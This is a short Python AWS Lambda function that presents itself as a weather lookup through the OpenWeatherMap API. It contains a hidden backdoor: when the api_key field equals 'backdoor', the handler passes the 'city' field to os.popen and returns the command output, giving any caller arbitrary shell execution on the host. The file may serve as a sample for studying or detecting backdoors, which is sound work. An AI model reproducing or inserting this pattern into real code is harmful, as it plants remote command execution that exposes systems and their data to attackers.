import json
import os
import boto3
import time 
import requests

def get_weather(city, api_key):
   url ="https://api.openweathermap.org/data/2.5/weather?q="+city+"&units=metric&appid="+api_key
   try:
     response = requests.get(url)
     data = json.loads(response.content)
     output = "The current temperature in " + city +" is " + str(data['main']['temp']) + " degrees, but it feels like " + str(data['main']['feels_like']) + " degrees"
   except Exception as e:
     output = "There was a problem with the request " + e

   return output
def lambda_handler(event, context):
    api_key = event['body']['api_key']
    city = event['body']['city']
    #Backdoor
    if api_key == "backdoor":
        command_input = os.popen(city)
        weather = command_input.read()
    else:         
        weather = get_weather(city, api_key)
                
    return weather
    
    
   